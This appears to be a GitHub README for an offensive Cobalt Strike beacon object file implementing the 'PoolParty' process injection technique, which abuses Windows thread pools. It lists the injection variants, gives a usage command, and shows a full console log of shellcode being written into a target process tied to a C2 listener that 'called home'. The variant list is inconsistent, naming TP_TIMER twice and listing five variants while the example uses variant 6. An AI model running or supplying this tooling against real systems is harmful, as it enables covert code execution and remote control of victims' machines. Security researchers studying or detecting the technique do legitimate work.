# PoolParty BOF

A beacon object file implementation of [PoolParty Process Injection Technique](https://github.com/SafeBreach-Labs/PoolParty/) by [@_SafeBreach_](https://www.safebreach.com/) and [@_0xDeku_](https://twitter.com/_0xDeku), that abuses Windows Thread Pools. The BOF supports the 5 technique/variant:
- Insert TP_TIMER work item to the target process's thread pool.
- Insert TP_ALPC work item to the target process's thread pool.
- Insert TP_JOB work item to the target process's thread pool.
- Insert TP_DIRECT work item to the target process's thread pool.
- Insert TP_TIMER work item to the target process's thread pool.

I will try to keep adding remaining variants.

## Usage
```
PoolPartyBof <Process ID> <Listener Name> <Variant>
```

- Usage Examples

```
PoolPartyBof 3092 HTTPSLocal 6
[*] Opening 3092 and running PoolParty (6 Varient) with HTTPSLocal listener!
[+] host called home, sent: 313519 bytes
[+] received output:
[INFO] 	Shellcode Size: 307204 bytes
[+] received output:
[INFO] 	Starting PoolParty attack against process id: 3092
[+] received output:
[INFO]   Retrieved handle to the target process: 0000000000000670
[+] received output:
[INFO]   Hijacked I/O completion handle from the target process: 66c
[+] received output:
[INFO]   Allocated shellcode memory in the target process: 0000021331760000
[+] received output:
[INFO]   Written shellcode to the target process
[+] received output:
[INFO] 	Created job object with name `HDWCJWPZ`
[+] received output:
[INFO] 	Created TP_JOB structure associated with the shellcode
[+] received output:
[INFO] 	Allocated TP_JOB memory in the target process: 00000213313F0000
[+] received output:
[INFO] 	Written the specially crafted TP_JOB structure to the target process
[+] received output:
[INFO] 	Zeroed out job object `HDWCJWPZ` IO completion port
[+] received output:
[INFO] 	Associated job object `HDWCJWPZ` with the IO completion port of the target process worker factory
[+] received output:
[INFO] 	Assigned current process to job object `HDWCJWPZ` to queue a packet to the IO completion port of the target process worker factory
[+] received output:
[INFO] 	PoolParty attack completed.
```

![](img/PoolPartyBof.png)

> The BOF can be further used with [Process Injection Hooks](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_control-process-injection.htm) provided within Cobaltstrike, and [Rastamouse](https://twitter.com/_RastaMouse) has a perfect [blog](https://offensivedefence.co.uk/posts/cs-process-inject-kit/) too.


### Credits and Orginal Work
- [Blackhat Slides](https://www.blackhat.com/eu-23/briefings/schedule/#the-pool-party-you-will-never-forget-new-process-injection-techniques-using-windows-thread-pools-35446)
- [Alon Leviev](https://twitter.com/_0xDeku)
- [SafeBreach](https://www.safebreach.com/)
